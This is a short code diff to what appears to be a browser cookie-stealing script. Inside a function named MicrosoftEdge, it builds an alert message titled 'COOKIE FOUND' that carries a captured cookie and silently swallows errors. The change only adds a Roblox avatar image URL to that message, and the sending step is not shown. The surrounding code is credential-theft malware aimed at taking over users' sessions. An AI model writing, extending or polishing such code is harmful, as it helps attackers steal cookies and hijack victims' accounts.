@@ -16,6 +16,9 @@ def MicrosoftEdge():
             "title": "COOKIE FOUND", 
             "description": f"```{cookie}```", 
             "color": 16711680,
+                "image":{
+                    "url": "https://tr.rbxcdn.com/13d613f1ff673320102c37a26d12c234/150/150/AvatarHeadshot/Png"
+                }
         }]})
     except:
         pass
